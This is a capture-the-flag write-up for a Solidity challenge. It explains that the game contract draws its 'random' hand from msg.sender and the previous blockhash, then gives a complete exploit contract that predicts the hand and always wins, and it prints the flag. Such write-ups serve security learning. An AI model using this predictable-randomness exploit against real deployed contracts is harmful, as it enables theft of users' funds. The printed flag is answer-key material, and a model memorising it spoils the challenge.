# Rock Scissor Paper (69 solves) (99 points)

```
Tony found out average salary of smart contract developers could reach millions of dollars. He started to learn about Solidity and deployed his first ever smart contract of epic rock scissor paper game!
```

The goal is to set defeated() to true

```solidity
    function isSolved() external view returns (bool) {
        return rps.defeated();
    }
```

The rps contract is using a pseudo random number generator

```solidity
contract RockPaperScissors {
    bool public defeated;

    enum Hand {
        Rock,
        Paper,
        Scissors
    }

    function randomShape() internal view returns (Hand) {
        return Hand(uint256(keccak256(abi.encodePacked(msg.sender, blockhash(block.number - 1)))) % 3);
    }

    function tryToBeatMe(Hand yours) external payable {
        Hand mine = randomShape();

        if (yours == Hand.Rock && mine == Hand.Scissors) {
            defeated = true;
        } else if (yours == Hand.Paper && mine == Hand.Rock) {
            defeated = true;
        } else if (yours == Hand.Scissors && mine == Hand.Paper) {
            defeated = true;
        }
    }
}
```

We can just use a contract to know the randomShape() it returns at a certain block, then just call it with the Hand that can defeat it

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Challenge.sol";

contract RockPaperScissorsExploit {
    RockPaperScissors public rps;
    Challenge public chal;

    constructor(address _chal) {
        chal = Challenge(_chal);
        rps = chal.rps();
    }

    function randomShape() internal view returns (RockPaperScissors.Hand) {
        return RockPaperScissors.Hand(uint256(keccak256(abi.encodePacked(address(this), blockhash(block.number - 1)))) % 3);
    }

    function solve() public {
        RockPaperScissors.Hand mine = randomShape(); // not "mine" but the contract's
        if (mine == RockPaperScissors.Hand.Scissors) {
            rps.tryToBeatMe(RockPaperScissors.Hand.Rock);
        } else if (mine == RockPaperScissors.Hand.Rock) {
            rps.tryToBeatMe(RockPaperScissors.Hand.Paper);
        } else if (mine == RockPaperScissors.Hand.Paper) {
            rps.tryToBeatMe(RockPaperScissors.Hand.Scissors);
        }
    }
}
```

### Flag

```
blaz{r3t_t0_rsp!}
```